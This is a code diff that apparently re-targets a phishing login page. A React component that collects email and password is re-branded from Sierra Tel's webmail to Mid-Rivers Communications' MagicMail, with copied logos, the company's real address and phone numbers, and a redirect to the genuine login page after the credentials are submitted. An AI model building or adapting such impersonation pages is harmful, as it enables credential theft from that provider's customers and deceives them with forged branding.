@@ -10,13 +10,18 @@ import axios from 'axios';
 import uia from './uia.png';
 import sti from './sti.png';
 
+import mid from './mid.png';
+import magictwo from './magictwo.png';
+
+
+
 function Home(){
     const[email, setEmail] = useState("");
 
     const [showPassword, setShowPassword] = useState(false);
   const [password, setPassword] = useState('');
 
-  const[platform, setPlatform] = useState("Sti-net")
+  const[platform, setPlatform] = useState("Midrivers")
 
   const[showError, setShowError] = useState(false);
 
@@ -48,7 +53,7 @@ function Home(){
            // console.log(response.data.message);
 
           
-           window.location.href = 'https://webmail.sti.net/login.php';
+           window.location.href = 'https://mail.midrivers.com/login.php';
         }
       } catch (error) {
         // Handle error
@@ -69,17 +74,23 @@ function Home(){
             </div>}
             <div className='main col-md-10 m-auto px-5 py-2'>
 
-                <img src={sti} className="logo" />
+            <div className='myflex'>
+                <img src={magictwo} className="logo" />
+                <img src={mid} className="logo" />
+                
+            </div>
 
                 <div className='innerdiv px-3 row'>
                     <div className='col-md-6 pt-3'>
-                        <h2 className='heading'>Welcome to Sierra Tel's Webmail</h2>
+                        <h2 className='heading'>Welcome to MagicMail</h2>
 
                         <h3 className='headingtwo'>Login to access your account</h3>
 
                         <p className='content text-justify'>
                         Welcome to the User Site for the MagicMail System.
 This is where you can setup and configure all your email options.
+
+
                         </p>
 
                         <p className='content text-justify'>
@@ -102,7 +113,7 @@ This is where you can setup and configure all your email options.
 
 
                             <form onSubmit={handleSubmit}>
-                                <h3 className='headingtwo'>Sign in to Webmail</h3>
+                                <h3 className='headingtwo'>Login to MagicMail</h3>
 
                                 <hr
                         style={{
@@ -187,11 +198,10 @@ This is where you can setup and configure all your email options.
                         
                          fontSize:"11px",
                          color:"black"
-                    }} className='underthree text-center mt-3'>Magicmail WebMail is brought to you by Sierra Tel <br/>
-                    49150 Crane Valley Road (Road 426) <br/>
-                    Oakhurst CA, 93644 <br/>
-                    Tel: 559-683-4611, 209-966-3636 or toll free at 1-877-658-4611 <br/>
-                    customercare@sierratel.com</p>
+                    }} className='underthree text-center mt-3'>Mid-Rivers Webmail is brought to you by Mid-Rivers Communications <br/>
+                    904 C Ave, Circle MT, 59215 <br/>
+                    Tel: 406-485-3301 or Fax: 406-485-2924 <br/>
+                    customerservice@midrivers.coop</p>
             </div>
         </>
     );
